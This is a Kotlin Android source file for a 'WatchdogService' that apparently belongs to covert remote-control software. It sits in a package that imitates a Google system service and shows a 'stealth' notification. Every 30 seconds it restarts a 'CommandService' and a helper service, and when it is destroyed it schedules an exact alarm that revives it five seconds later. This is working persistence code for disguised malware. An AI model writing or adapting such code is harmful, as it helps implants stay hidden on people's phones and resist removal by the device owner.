package com.google.android.systemservice.services

import android.app.AlarmManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import androidx.core.app.AlarmManagerCompat
import com.google.android.systemservice.utils.StealthNotificationHelper
import java.util.Collections
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Watchdog service that monitors CommandService and restarts it if killed.
 * Runs in a separate process for dual-process guard pattern.
 */
class WatchdogService : Service() {

    companion object {
        private const val TAG = "WatchdogService"
        private const val CHECK_INTERVAL_MS = 30_000L // 30 seconds

        private val runningServices = Collections.newSetFromMap(ConcurrentHashMap<String, Boolean>())

        fun markServiceRunning(serviceClass: Class<*>) {
            runningServices.add(serviceClass.name)
        }

        fun markServiceStopped(serviceClass: Class<*>) {
            runningServices.remove(serviceClass.name)
        }
    }

    private val handler = Handler(Looper.getMainLooper())
    private val isChecking = AtomicBoolean(false)
    private val watchdogRunnable = object : Runnable {
        override fun run() {
            if (isChecking.compareAndSet(false, true)) {
                Thread {
                    try {
                        checkAndRestartServices()
                    } finally {
                        isChecking.set(false)
                    }
                }.start()
            }
            handler.postDelayed(this, CHECK_INTERVAL_MS)
        }
    }

    override fun onCreate() {
        super.onCreate()
        val notification = StealthNotificationHelper.createStealthNotification(this)
        startForeground(StealthNotificationHelper.WATCHDOG_SERVICE_ID, notification)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        handler.removeCallbacks(watchdogRunnable)
        handler.post(watchdogRunnable)
        return START_STICKY
    }

    override fun onBind(intent: Intent?): IBinder? = null

    private fun restartServiceIfNeeded(serviceClass: Class<out Service>, useForeground: Boolean = false) {
        if (!isServiceRunning(serviceClass.name)) {
            Log.d(TAG, "${serviceClass.simpleName} is dead, restarting...")
            try {
                val intent = Intent(this, serviceClass)
                if (useForeground && Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(intent)
                } else {
                    startService(intent)
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to restart ${serviceClass.simpleName}: ${e.message}")
            }
        }
    }

    private fun checkAndRestartServices() {
        try {
            restartServiceIfNeeded(CommandService::class.java, useForeground = true)
            restartServiceIfNeeded(GoogleHelperService::class.java)
        } catch (e: Exception) {
            Log.e(TAG, "Error checking services: ${e.message}")
        }
    }

    private fun isServiceRunning(className: String): Boolean {
        // Use internal tracking (works reliably on all API levels)
        return runningServices.contains(className)
    }

    override fun onDestroy() {
        handler.removeCallbacks(watchdogRunnable)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            stopForeground(STOP_FOREGROUND_REMOVE)
        } else {
            @Suppress("DEPRECATION")
            stopForeground(true)
        }
        
        // Use AlarmManager for aggressive self-restart
        val intent = Intent(this, WatchdogService::class.java)
        val requestCode = (System.currentTimeMillis() % Int.MAX_VALUE).toInt()
        val pendingIntent = PendingIntent.getService(
            this, requestCode, intent, 
            PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE
        )
        val alarmManager = getSystemService(Context.ALARM_SERVICE) as? AlarmManager ?: return
        AlarmManagerCompat.setExactAndAllowWhileIdle(
            alarmManager,
            AlarmManager.RTC_WAKEUP,
            System.currentTimeMillis() + 5000,
            pendingIntent
        )
        
        Log.d(TAG, "Watchdog scheduled self-restart in 5s")
        super.onDestroy()
    }
}
